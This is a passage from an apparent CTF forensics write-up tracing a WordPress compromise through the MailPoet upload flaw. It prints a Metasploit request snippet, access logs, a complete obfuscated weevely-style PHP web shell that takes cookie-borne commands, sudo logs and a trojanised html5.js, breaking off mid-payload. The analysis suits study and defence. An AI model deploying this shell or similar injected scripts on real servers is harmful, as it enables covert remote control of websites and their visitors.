</span><span class='line'>  <span class="s1">&#39;method&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;uri&#39;</span>      <span class="o">=&gt;</span> <span class="n">uri</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;ctype&#39;</span>    <span class="o">=&gt;</span> <span class="s2">&quot;multipart/form-data; boundary=</span><span class="si">#{</span><span class="n">data</span><span class="o">.</span><span class="n">bound</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;page&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;wysija_campaigns&#39;</span><span class="p">,</span> <span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;themes&#39;</span> <span class="p">},</span>
</span><span class='line'>  <span class="s1">&#39;data&#39;</span>     <span class="o">=&gt;</span> <span class="n">post_data</span>
</span><span class='line'><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<p>and if we look at the apache access log, we could find:</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&amp;action=themes HTTP/1.1" 302 385 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</code></pre>

<p>Ok, now let&rsquo;s see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">payload_uri</span> <span class="o">=</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;wp-content&#39;</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="s1">&#39;wysija&#39;</span><span class="p">,</span> <span class="s1">&#39;themes&#39;</span><span class="p">,</span> <span class="n">theme_name</span><span class="p">,</span> <span class="n">payload_name</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>so by grepping the logs again we could find</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1" 200 165 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
</code></pre>

<p>Let&rsquo;s give a look at this file, it&rsquo;s most likely gonna be malicious, and in fact</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$hije</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;ey&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;seyteyrey_reyeeypleyaeyceye&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$andp</span><span class="o">=</span><span class="s2">&quot;JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$rhhm</span><span class="o">=</span><span class="s2">&quot;nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$pvqw</span><span class="o">=</span><span class="s2">&quot;GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$wfrm</span><span class="o">=</span><span class="s2">&quot;bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$vyoh</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;nbnansne64n_ndnecode&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$bpzy</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;z&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;zczreaztzez_zfzuznzcztzizon&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$xhju</span> <span class="o">=</span> <span class="nv">$bpzy</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$vyoh</span><span class="p">(</span><span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;sq&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$andp</span><span class="o">.</span><span class="nv">$pvqw</span><span class="o">.</span><span class="nv">$wfrm</span><span class="o">.</span><span class="nv">$rhhm</span><span class="p">)));</span> <span class="nv">$xhju</span><span class="p">();</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This is definitely a web shell, and by looking at it, it&rsquo;s most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn&rsquo;t use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.</p>

<p>So from now on, understanding what happened was a real deal.</p>

<p>The attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?</p>

<p>It&rsquo;s fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn&rsquo;t follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.</p>

<p>And it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.</p>

<pre><code>Sep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}
</code></pre>

<p>what was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?</p>

<p>Giving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">m</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">elements</span><span class="p">;</span>
</span><span class='line'>      <span class="k">return</span> <span class="s2">&quot;string&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">a</span> <span class="o">?</span> <span class="nx">a</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">a</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]];</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">h</span><span class="o">++</span><span class="p">,</span> <span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]</span> <span class="o">=</span> <span class="nx">h</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">h</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">b</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">p</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">c</span> <span class="o">||</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">b</span><span class="p">));</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">].</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">r</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">)).</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">canHaveChildren</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">s</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="nx">b</span><span class="p">.</span><span class="nx">cache</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span><span class="p">();</span>
</span><span class='line'>      <span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">return</span> <span class="o">!</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivMethods</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">:</span> <span class="nx">p</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span>
</span><span class='line'>      <span class="p">};</span>
</span><span class='line'>      <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">(</span><span class="s2">&quot;h,f&quot;</span><span class="p">,</span> <span class="s2">&quot;return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&amp;&amp;(&quot;</span> <span class="o">+</span> <span class="nx">m</span><span class="p">().</span><span class="nx">join</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\w\-]+/g</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>          <span class="k">return</span> <span class="s1">&#39;c(&quot;&#39;</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="s1">&#39;&quot;)&#39;</span>
</span><span class='line'>      <span class="p">})</span> <span class="o">+</span> <span class="s2">&quot;);return n}&quot;</span><span class="p">)(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">q</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivCSS</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">j</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">d</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">||</span> <span class="nx">d</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;x&lt;style&gt;article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}&lt;/style&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">lastChild</span><span class="p">,</span> <span class="nx">d</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span> <span class="o">=</span> <span class="o">!!</span><span class="nx">c</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="nx">g</span> <span class="o">||</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">a</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">||</span> <span class="p">{},</span>
</span><span class='line'>      <span class="nx">s</span> <span class="o">=</span> <span class="sr">/^&lt;|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">r</span> <span class="o">=</span> <span class="sr">/^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">j</span><span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="s2">&quot;_html5shiv&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">n</span> <span class="o">=</span> <span class="p">{},</span>
</span><span class='line'>      <span class="nx">g</span><span class="p">;</span>
</span><span class='line'>  <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">a</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;xyz&gt;&lt;/xyz&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">j</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span> <span class="k">in</span> <span class="nx">a</span><span class="p">;</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">==</span> <span class="nx">a</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">.</span><span class="nx">length</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>              <span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
</span><span class='line'>              <span class="nx">b</span> <span class="o">=</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cloneNode</span> <span class="o">||</span>
</span><span class='line'>                  <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">||</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">g</span> <span class="o">=</span> <span class="nx">j</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">})();</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">elements</span><span class="o">:</span> <span class="nx">k</span><span class="p">.</span><span class="nx">elements</span> <span class="o">||</span> <span class="s2">&quot;abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">version</span><span class="o">:</span> <span class="s2">&quot;3.7.0&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivCSS</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivCSS</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">supportsUnknownElements</span><span class="o">:</span> <span class="nx">g</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivMethods</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivMethods</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">type</span><span class="o">:</span> <span class="s2">&quot;default&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivDocument</span><span class="o">:</span> <span class="nx">q</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">createElement</span><span class="o">:</span> <span class="nx">p</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">createDocumentFragment</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
</span><span class='line'>          <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">||</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(),</span> <span class="nx">d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">m</span><span class="p">(),</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">d</span> <span class="o">&lt;</span> <span class="nx">h</span><span class="p">;</span> <span class="nx">d</span><span class="o">++</span><span class="p">)</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="nx">d</span><span class="p">]);</span>
</span><span class='line'>          <span class="k">return</span> <span class="nx">c</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
</span><span class='line'>  <span class="nx">q</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
</span><span class='line'><span class="p">})(</span><span class="k">this</span><span class="p">,</span> <span class="nb">document</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">m</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
